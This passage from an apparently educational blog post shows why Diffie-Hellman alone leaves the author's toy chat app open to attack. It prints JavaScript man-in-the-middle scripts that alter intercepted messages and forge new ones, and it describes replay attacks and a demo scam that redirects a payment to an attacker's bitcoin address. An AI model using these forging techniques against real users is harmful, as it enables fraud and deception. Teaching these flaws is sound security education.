rl.question('Modified message (leave empty for no change): ', (
  modifiedMessage) => {
  if (modifiedMessage.length === 0) {
    modifiedMessage = decryptedMessage
  }
  const encryptedMessage = aes256.encrypt(aesKeyWithTargetB,
    modifiedMessage)
  ourMessages.push(encryptedMessage)
  setTimeout(() => {
    socket.emit('sendMessage', {
      sender: targetA,
      receiver: targetB,
      message: encryptedMessage,
      handshake: false,
    })
  }, 100);
})
// ...
```

This can be used to social engineer convincing messages. See how it is used to convince Elia to send money to the attacker’s bitcoin address rather than Magnus’s bank account in the following demo.
<YouTube id='BZyD1sA88M0'/>

Here’s a screenshot from the demo video:
![ MITM Attack Screenshot ](/img/chat-app-iter-2-MITM-screenshot.png)
A snippet of Magnus’s browser is on the left and Elia’s is on the right. Smooth operator.

#### Sending forged messages whenever we want
We can also send messages whenever we want to our targets once we’ve conducted the initial MITM attack. This feature is implemented in diffieMITM_ModifyMessages.js, shown below. Here’s a demo video showcasing this attack:

https://drive.google.com/file/d/1OlZ1csK-T7YPxolmpPEvekUpUwzNEyyw/view?usp=sharing

TODO: embed video

```javascript
// diffieMITM_SendMessages.js

// ...
let aesKeyWithTargetA, aesKeyWithTargetB;
const targetA = 'Magnus';
const targetB = 'Elia';

// Helper function to encrypt a message with the
// key shared with the passed in receiver
// and send the encrypted message to the receiver
function sendMessage(receiver, message) {
  const encryptedMessage = aes256.encrypt(receiver === targetA ?
    aesKeyWithTargetA : aesKeyWithTargetB, message);
  setTimeout(() => {
    socket.emit('sendMessage', {
      sender: receiver === targetA ? targetB : targetA,
      receiver: receiver,
      message: encryptedMessage,
      handshake: false,
    });
  }, 100);
}

// Ask for a message and who to send it to
const askRecipientAndMessage = () => {
  rl.question('Recipient: ', (receiver) => {
    rl.question('Message: ', (message) => {
      sendMessage(receiver, message);
      askRecipientAndMessage(); // Loop indefinitely
    });
  });
};

// Get the AES keys shared with the targets
rl.question('aesKeyWithTargetA: ', (keyA) => {
  aesKeyWithTargetA = keyA;

  rl.question('aesKeyWithTargetB: ', (keyB) => {
    aesKeyWithTargetB = keyB;
    askRecipientAndMessage(); // Call helper function
  });
});
```

### Replay attacks
Our chat app is also vulnerable to replay attacks. An attacker could connect to the server and listen in to messages. They could then emit the same messages to the receiver and they will show up on the receiver’s chat stream. The messages can be replayed while the same connection is intact. If the users go offline, the message can no longer be replayed. Even if they go online again, they will perform a new handshake, generating a new shared key, so if the message is replayed, it will decrypt into garbage. 

A drawback to this attack in our chat app is that when we replay a message, the server will emit it to all users, so the sender will also receive the message and it will show up on their feed, which could raise suspicion.

### Reflections
We can see that the Diffie-Hellman key exchange protocol shows potential as a good building block for a secure chat app. But on its own, it compromises confidentiality, vulnerable to man in the middle attacks, since it lacks mechanisms for ensuring integrity and authentication. 

---
TODO: Link to next blog